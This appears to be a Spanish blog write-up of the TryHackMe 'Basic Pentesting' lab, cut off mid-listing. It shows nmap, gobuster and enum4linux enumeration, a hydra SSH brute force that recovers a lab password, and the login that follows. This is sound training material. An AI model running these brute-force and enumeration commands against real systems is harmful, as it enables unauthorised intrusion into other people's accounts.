<!DOCTYPE html>
<html class="" lang="en"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            Basic Pentesting - TryHackMe  &ndash;
        
        K3ssDev
:/var/log$  
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
<meta name="author" content="Alberto Pérez" />

    
        <meta name="keywords" content='CTF, easy, hacking, THM, tryhackme, writeup' />
    
    
        <meta name="description" content="ryHackMe &amp;gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. A continuación dejo el enlace de THM:" />
    

<meta property="og:site_name"
    content='K3ssDev
:/var/log$  ' />

    <meta property="og:title" content="Basic Pentesting - TryHackMe" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Alberto Pérez" />
    <meta
        property="article:published_time"
        content='2022-10-12T00:00:00Z&#43;0000' />
    
        
            <meta property="article:tag" content="CTF" />
        
            <meta property="article:tag" content="easy" />
        
            <meta property="article:tag" content="hacking" />
        
            <meta property="article:tag" content="THM" />
        
            <meta property="article:tag" content="tryhackme" />
        
            <meta property="article:tag" content="writeup" />
        
    
    <meta property="og:url" content="https://k3ssdev.github.io/posts/basic-pentesting/" />
    <meta property="og:image"
        content='https://k3ssdev.github.io/images/post_pics/basic-pentesting/moMbBki.png
        ' />
    
        <meta property="og:description" content="Basic Pentesting - TryHackMe &amp;gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de re" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='k3ssdev.github.io'
/>
<meta property="twitter:url" content="https://k3ssdev.github.io/posts/basic-pentesting/" />


    <meta name="twitter:title" content="Basic Pentesting - TryHackMe" />
    
    <meta name="twitter:image"
        content='https://k3ssdev.github.io/images/post_pics/basic-pentesting/moMbBki.png
        ' />
    
        <meta name="twitter:description" content="Basic Pentesting - TryHackMe &amp;gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de re" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">K3ssDev
:/var/log$  </a>
                        
                    </h1>
                    
                        <label id="hamburger-menu" for="main-nav-toggler">
                            &#xf85b;
                        </label>
                    
                </div>
                <div id="wide_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="mailto:albertoperezdelrio@gmail.com">
    
    
        &#xf6ed;
    
    <span>
        Email
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
    
    
        &#xf0e1;
    
    <span>
        Linkedin
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/k3sscode">
    
    
        &#xf09b;
    
    <span>
        Github
    </span>
</a>

    </div>
    
        <div id="sidebar_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
        
    
<script src="https://tryhackme.com/badge/1277295"></script>


</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Basic Pentesting - TryHackMe</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2022-10-12

</p>
    
    
    
        <figure style="margin: 0">
            <img src="/images/post_pics/basic-pentesting/moMbBki.png" alt="" />
            
        </figure>
    
    
    <div><h1 id="basic-pentesting---tryhackme-">Basic Pentesting - TryHackMe &gt;</h1>
<p>Hoy traigo unos apuntes que me he hecho para una máquina fácil de <em>TryHackMe</em>. En ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. A continuación dejo el enlace de THM:</p>
<p><a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></p>
<p>Según dice la introducción de la sala, estos son los conceptos que se van a aprender con ésta máquina:</p>
<ul>
<li>brute forcing</li>
<li>hash cracking</li>
<li>service enumeration</li>
<li>Linux Enumeration</li>
</ul>
<p>Se puede usar al &ldquo;AttackBox&rdquo; de TryHackMe o, como es mi caso, conectarse por VPN y atacar con mi propia máquina.</p>
<p>¡Así que vamos a ello!</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>El primer paso es iniciar la máquina vulnerable y esperar a que nos de la dirección IP. Una vez la tenemos, un simple <strong>ping</strong> nos ayudará a estar seguros de que estamos en la misma red y vemos a la máquina objetivo. En mi caso, me ha dado la IP 10.10.59.211 y con el ping compruebo que veo al objetivo.</p>
<p>Ejecuto un reconocimiento de puertos usando nmap. En esta máquina no importa hacer algo de ruido, asi que uso las opciones <strong>-sC</strong> (&ndash;script=default) y <strong>&ndash;open</strong> (mostrar solo puertos abiertos):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -sC --open 10.10.59.211 
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-12 15:48 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.59.211
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">994</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> db45cbbe4a8b71f8e93142aefff845e4 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 09b9b91ce0bf0e1c6f7ffe8e5f201bce <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a5682b225f984a62213da2e2c5a9f7c2 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>8009/tcp open  ajp13
</span></span><span style="display:flex;"><span>| ajp-methods: 
</span></span><span style="display:flex;"><span>|_  Supported methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
</span></span><span style="display:flex;"><span>|_http-favicon: Apache Tomcat
</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat/9.0.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb-os-discovery: 
</span></span><span style="display:flex;"><span>|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Computer name: basic2
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: BASIC2<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   FQDN: basic2
</span></span><span style="display:flex;"><span>|_  System time: 2022-10-12T09:48:31-04:00
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
</span></span><span style="display:flex;"><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span>|   account_used: guest
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   311: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span style="color:#ae81ff">000000000000</span> <span style="color:#f92672">(</span>Xerox<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2022-10-12T13:48:31
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 31.92 seconds
</span></span></code></pre></div><p>En el escaneo de puertos ya vemos algunas cosas interesantes:</p>
<ul>
<li>Tiene el puerto 22 abierto para un servicio ssh.</li>
<li>En el puerto 80 tiene un servidor Apache.</li>
<li>Tiene un servicio SMB en el puerto 445</li>
</ul>
<p>Vamos a empezar por el vector más obvio, el servidor web. Asi que pongo la IP en la barra de direcciones del navegador y miro lo que hay.</p>
<p><img src="/images/post_pics/basic-pentesting/01.png" alt="http://10.10.59.211/"></p>
<p>La página está en construcción, pero podría haber más páginas colgadas que ahora mismo no podemos ver. Es en este momento cuando uso la herramienta <strong>GoBuster</strong> para intentar descubrir si hay algo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.10.59.211/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.2.0-dev
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.59.211/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/10/12 16:13:01 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/development          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.59.211/development/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">9638</span> / <span style="color:#ae81ff">141709</span> <span style="color:#f92672">(</span>6.80%<span style="color:#f92672">)</span>^C
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Keyboard interrupt detected, terminating.
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/10/12 16:13:41 Finished
</span></span></code></pre></div><p>GoBuster va probando una lista de palabras detrás de la dirección que he indicado, y dependiendo del mensaje http que reciba, marca la dirección como coincidencia positiva o negativa. En este caso, parece que hay una pagína de <strong>devolopment</strong> colgada, así que pruebo a acceder a ella.</p>
<p><img src="/images/post_pics/basic-pentesting/02.png" alt="http://10.10.59.211/"></p>
<p>En estos ficheros veo que han configurado un servicio SMB y que hay dos desarrolladores, uno llamado <strong>J</strong> y otro llamado <strong>K</strong>, que se intercambian mensajes. Al parecer, <strong>K</strong> deja un mensaje a <strong>J</strong> sobre que la contraseña que ha puesto a su usario es muy débil y no cumple con las reglas de seguridad de la empresa. Esto es importante, ¡ya sabemos que necesitamos conseguir el usuario de <strong>J</strong>!</p>
<p>Bien, pues ahora toca hacer una enumeración del servicio SMB usando la herramienta <strong>enum4linux</strong> para conseguir el usuario de <strong>J</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ enum4linux 10.10.59.211 
</span></span><span style="display:flex;"><span>Starting enum4linux v0.9.1 <span style="color:#f92672">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style="color:#f92672">)</span> on Wed Oct <span style="color:#ae81ff">12</span> 16:22:02 2022
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">=========================================(</span> Target Information <span style="color:#f92672">)=========================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target ........... 10.10.59.211
</span></span><span style="display:flex;"><span>RID Range ........ 500-550,1000-1050
</span></span><span style="display:flex;"><span>Username ......... <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>Password ......... <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">============================(</span> Enumerating Workgroup/Domain on 10.10.59.211 <span style="color:#f92672">)============================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got domain/workgroup name: WORKGROUP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">================================(</span> Nbtstat Information <span style="color:#66d9ef">for</span> 10.10.59.211 <span style="color:#f92672">)================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Looking up status of 10.10.59.211
</span></span><span style="display:flex;"><span>	BASIC2          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
</span></span><span style="display:flex;"><span>	BASIC2          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
</span></span><span style="display:flex;"><span>	BASIC2          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
</span></span><span style="display:flex;"><span>	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
</span></span><span style="display:flex;"><span>	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
</span></span><span style="display:flex;"><span>	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
</span></span><span style="display:flex;"><span>	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>El informe que nos muestra <strong>enum4linux</strong> es bastante completo y largo. Tras revisarlo, me quedo con estos datos:</p>
<ul>
<li>El equipo se llama BASIC2</li>
<li>Están compartiendo la carpeta //10.10.59.211/Anonymous sin seguridad</li>
<li>Hay dos usuarios, <strong>kay</strong> y <strong>jan</strong></li>
</ul>
<p><img src="/images/post_pics/basic-pentesting/03.png" alt="http://10.10.59.211/"></p>
<h2 id="ataque-de-fuerza-bruta-contra-ssh">Ataque de fuerza bruta contra ssh</h2>
<p>Ahora ya tengo un usuario (jan) para poder realizar mi ataque de fuerza bruta contra el objetivo e intentar tener acceso remoto mediante SSH. Para poder hacerlo, voy a usar la herramienta <strong>hydra</strong> y una wordlist para que pruebe contraseñas con el usuario <strong>jan</strong>. Depende de lo larga que sea la lista, el ataque durará más o menos. En mi caso le llevó algunos minutos, asi que sed pacientes. Paciencia&hellip;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ hydra -l jan -P Descargas/rockyou.txt 10.10.59.211 ssh
</span></span><span style="display:flex;"><span>Hydra v9.3 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2022-10-12 16:43:07
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.59.211:22/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 176.00 tries/min, <span style="color:#ae81ff">176</span> tries in 00:01h, <span style="color:#ae81ff">14344223</span> to <span style="color:#66d9ef">do</span> in 1358:22h, <span style="color:#ae81ff">16</span> active
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 128.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:03h, <span style="color:#ae81ff">14344015</span> to <span style="color:#66d9ef">do</span> in 1867:43h, <span style="color:#ae81ff">16</span> active
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.59.211   login: jan   password: armando
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2022-10-12 16:49:50
</span></span></code></pre></div><p>Ya tenemos la clave: <strong>armando</strong>. Ahora me conecto por ssh con el usuario de <strong>jan</strong> y vemos que hay ahí dentro.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ssh jan@10.10.59.211                
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.59.211 (10.10.59.211)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:12: [hashed name]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.59.211<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">jan@10.10.59.211&#39;</span>s password: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packages can be updated.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates are security updates.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span style="display:flex;"><span>applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span style="display:flex;"><span>applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon Apr <span style="color:#ae81ff">23</span> 15:55:45 <span style="color:#ae81ff">2018</span> from 192.168.56.102
</span></span><span style="display:flex;"><span>jan@basic2:~$ 
</span></span></code></pre></div><p>Sabemos que hay otro usuario llamado kay, así que tiene que tener una carpeta personal. Me muevo hasta ella y reviso que hay.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jan@basic2:~$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> ..
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> root jan    <span style="color:#ae81ff">47</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .lesshst
</span></span><span style="display:flex;"><span>jan@basic2:~$ cd ..
</span></span><span style="display:flex;"><span>jan@basic2:/home$ ls
</span></span><span style="display:flex;"><span>jan  kay
</span></span><span style="display:flex;"><span>jan@basic2:/home$ cd kay
</span></span><span style="display:flex;"><span>jan@basic2:/home/kay$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kay  kay  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> ..
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> kay  kay   <span style="color:#ae81ff">756</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .bash_history
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kay  kay   <span style="color:#ae81ff">220</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kay  kay  <span style="color:#ae81ff">3771</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> .bashrc
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> kay  kay  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> .cache
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> root kay   <span style="color:#ae81ff">119</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .lesshst
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">2</span> kay  kay  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .nano
